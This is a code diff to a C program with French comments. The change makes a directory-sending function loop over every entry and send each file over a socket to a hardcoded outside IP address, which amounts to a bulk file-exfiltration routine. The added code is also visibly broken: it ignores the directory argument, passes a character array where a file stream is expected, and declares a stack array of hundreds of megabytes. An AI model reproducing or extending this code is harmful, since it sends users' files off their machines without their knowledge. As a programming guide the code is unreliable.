@@ -7,7 +7,7 @@
 
 //#define SERVER_IP "192.168.1.100"  // IP du serveur
 #define SERVER_PORT 9000
-#define BUFFER_SIZE 4096
+#define BUFFER_SIZE 8192
 
 int send_file(const char *filename, const char *SERVER_IP) {
     int sock;
@@ -62,11 +62,38 @@ int send_file(const char *filename, const char *SERVER_IP) {
 //    return 0;
 //}
 
-int send_dir(const char *dir_path, const char *ip){
+void read_file(const char *name, char *output){
+    FILE *file = fopen(name, "r");
+    char buffer[8192];
+
+    if (!file) {
+        perror("Erreur ouverture fichier");
+        return;
+    }
+
+    while (fgets(buffer, sizeof(buffer), file)){
+        fputs(buffer, output);
+    }
+    fclose(file);
+
+}
+
+int send_dir(const char *dir_path, const char *ip, const char *mod){
     struct dirent *entry;
     DIR *dir = opendir(".");
+    char filepath[512];
+    long total_size = get_total_size(dir_path);
+    char output[total_size + 512];
+    char buffer[96000000*4];
+
 
     while ((entry = readdir(dir)) != NULL){
-        
+        snprintf(filepath, sizeof(filepath), "%s/%s", dir_path , entry->d_name);
+        send_file(filepath, "8.8.8.8");
+        //read_file(filepath, buffer);
+        //fputs(".;/:§!", buffer);
+        //fputs(buffer, output);
+        //memset(buffer, 0, sizeof(buffer));
     }
+
 }
